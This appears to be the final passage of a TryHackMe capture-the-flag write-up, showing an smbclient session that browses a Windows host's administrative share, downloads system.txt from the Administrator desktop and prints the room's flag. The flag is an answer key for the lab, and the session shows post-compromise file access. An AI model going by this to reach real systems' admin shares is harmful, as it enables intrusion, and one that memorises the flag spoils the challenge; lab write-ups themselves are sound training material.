  $Recycle.Bin                      DHS        0  Wed Feb 24 03:33:20 2021
  Documents and Settings          DHSrn        0  Tue Feb 23 10:11:41 2021
  Enterprise-Share                    D        0  Sat Jul 16 20:05:46 2022
  pagefile.sys                      AHS 1073741824  Sat Jul 16 20:03:04 2022
  PerfLogs                            D        0  Tue Feb 23 12:02:00 2021
  Program Files                      DR        0  Mon Mar  1 01:40:11 2021
  Program Files (x86)                 D        0  Tue Feb 23 01:16:06 2021
  ProgramData                       DHn        0  Sat Jul 16 20:36:13 2022
  Recovery                         DHSn        0  Tue Feb 23 01:12:20 2021
  System Volume Information         DHS        0  Tue Feb 23 14:41:25 2021
  Users                              DR        0  Wed Feb 24 03:32:40 2021
  Windows                             D        0  Mon Mar  1 01:46:44 2021

                9558271 blocks of size 4096. 5010317 blocks available
smb: \> cd Users
smb: \Users\> ls
  .                                  DR        0  Wed Feb 24 03:32:40 2021
  ..                                 DR        0  Wed Feb 24 03:32:40 2021
  Administrator                       D        0  Wed Feb 24 09:49:29 2021
  All Users                       DHSrn        0  Sat Sep 15 12:58:48 2018
  Default                           DHR        0  Tue Feb 23 10:11:41 2021
  Default User                    DHSrn        0  Sat Sep 15 12:58:48 2018
  desktop.ini                       AHS      174  Sat Sep 15 12:46:48 2018
  enterprise-security                 D        0  Sat Feb 27 01:39:06 2021
  Public                             DR        0  Tue Feb 23 01:16:16 2021

                9558271 blocks of size 4096. 5010318 blocks available
smb: \Users\> cd Administrator\
smb: \Users\Administrator\> ls
  .                                   D        0  Sat Jul 16 19:10:10 2022
  ..                                  D        0  Sat Jul 16 19:10:10 2022
  3D Objects                         DR        0  Tue Feb 23 03:25:20 2021
  AppData                            DH        0  Tue Feb 23 01:15:13 2021
  Application Data                DHSrn        0  Tue Feb 23 01:15:13 2021
  Contacts                           DR        0  Tue Feb 23 03:25:21 2021
  Cookies                         DHSrn        0  Tue Feb 23 01:15:13 2021
  Desktop                            DR        0  Wed Feb 24 09:57:33 2021
  Documents                          DR        0  Tue Feb 23 03:25:21 2021
  Downloads                          DR        0  Tue Feb 23 03:25:21 2021
  Favorites                          DR        0  Tue Feb 23 03:25:21 2021
  Links                              DR        0  Tue Feb 23 03:25:22 2021
  Local Settings                  DHSrn        0  Tue Feb 23 01:15:13 2021
  Music                              DR        0  Tue Feb 23 03:25:21 2021
  My Documents                    DHSrn        0  Tue Feb 23 01:15:13 2021
  NetHood                         DHSrn        0  Tue Feb 23 01:15:13 2021
  NTUSER.DAT                        AHn   786432  Sat Jul 16 19:10:10 2022
  ntuser.dat.LOG1                   AHS        0  Tue Feb 23 01:15:11 2021
  ntuser.dat.LOG2                   AHS        0  Tue Feb 23 01:15:11 2021
  NTUSER.DAT{1c3790b4-b8ad-11e8-aa21-e41d2d101530}.TM.blf    AHS    65536  Tue Feb 23 01:15:13 2021
  NTUSER.DAT{1c3790b4-b8ad-11e8-aa21-e41d2d101530}.TMContainer00000000000000000001.regtrans-ms    AHS   524288  Tue Feb 23 01:15:13 2021
  NTUSER.DAT{1c3790b4-b8ad-11e8-aa21-e41d2d101530}.TMContainer00000000000000000002.regtrans-ms    AHS   524288  Tue Feb 23 01:15:13 2021
  ntuser.ini                         HS       20  Tue Feb 23 01:15:13 2021
  Pictures                           DR        0  Tue Feb 23 03:25:21 2021
  PrintHood                       DHSrn        0  Tue Feb 23 01:15:13 2021
  Recent                          DHSrn        0  Tue Feb 23 01:15:13 2021
  Saved Games                        DR        0  Tue Feb 23 03:25:21 2021
  Searches                           DR        0  Tue Feb 23 03:25:21 2021
  SendTo                          DHSrn        0  Tue Feb 23 01:15:13 2021
  Start Menu                      DHSrn        0  Tue Feb 23 01:15:13 2021
  Templates                       DHSrn        0  Tue Feb 23 01:15:13 2021
  Videos                             DR        0  Tue Feb 23 03:25:21 2021

                9558271 blocks of size 4096. 5010318 blocks available
smb: \Users\Administrator\> cd Desktop\
smb: \Users\Administrator\Desktop\> ls
  .                                  DR        0  Wed Feb 24 09:57:33 2021
  ..                                 DR        0  Wed Feb 24 09:57:33 2021
  desktop.ini                       AHS      282  Tue Feb 23 03:25:21 2021
  system.txt                          A       37  Wed Feb 24 09:57:45 2021

                9558271 blocks of size 4096. 5010318 blocks available
smb: \Users\Administrator\Desktop\> get system.txt
getting file \Users\Administrator\Desktop\system.txt of size 37 as system.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
```

The ```system.txt``` is ```THM{d540c0645975900e5bb9167aa431fc9b}```

```shell
root@rE3oN:~/enum-more/obsidian_vault/VulnNetActive# cat system.txt
THM{d540c0645975900e5bb9167aa431fc9b} 
```


